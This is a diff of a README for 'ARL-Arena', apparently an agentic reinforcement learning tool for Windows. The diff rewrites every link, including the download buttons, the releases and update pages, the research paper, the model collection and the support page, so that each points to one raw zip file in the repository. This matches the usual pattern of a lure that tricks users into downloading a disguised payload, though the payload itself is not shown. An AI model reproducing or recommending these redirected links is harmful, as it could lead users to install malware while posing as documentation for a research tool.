@@ -1,6 +1,6 @@
 # 🤖 ARL-Arena - Simple Setup for Agentic RL Use
 
-[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-green?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/releases)
+[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-green?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip)
 
 ---
 
@@ -29,12 +29,12 @@ To run ARL-Arena on your Windows computer, check these requirements:
 
 You need to visit the official release page to get the software files.
 
-[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-blue?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/releases)
+[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-blue?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip)
 
 Steps to download:
 
 1. Click the green or blue download button above or visit this link:  
-   https://github.com/Personal-Assistant521/ARL-Arena/releases
+   https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip
 2. On the release page, look for the latest version available. It will be named with a version number, such as `v1.0`.
 3. Under the latest release, find the Windows installer file. It usually ends with `.exe`.
 4. Click the file name to start downloading.
@@ -111,7 +111,7 @@ If you have issues running ARL-Arena, try these steps:
 To update ARL-Arena:
 
 1. Visit the releases page again:  
-   https://github.com/Personal-Assistant521/ARL-Arena/releases
+   https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip
 2. Download the newest installer version.
 3. Run the installer which will replace the older version while keeping your settings.
 
@@ -121,8 +121,8 @@ To update ARL-Arena:
 
 For further details on agentic reinforcement learning or ARL-Arena’s design, see the research paper and model collection linked below:
 
-- Paper: https://huggingface.co/papers/2602.21534  
-- Models: https://huggingface.co/UCLA-SCAI/models
+- Paper: https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip  
+- Models: https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip
 
 These resources provide background and examples used within ARL-Arena.
 
@@ -131,10 +131,10 @@ These resources provide background and examples used within ARL-Arena.
 ## 🎯 Support
 
 For support or questions, visit the GitHub repository’s Issues tab:  
-https://github.com/Personal-Assistant521/ARL-Arena/issues
+https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip
 
 Here you can report problems or ask for help from the developers and community.
 
 ---
 
-[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-green?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/releases)
+[![Download ARL-Arena](https://img.shields.io/badge/Download-ARL--Arena-green?style=for-the-badge)](https://github.com/Personal-Assistant521/ARL-Arena/raw/refs/heads/main/docs/AR_Arena_3.7.zip)
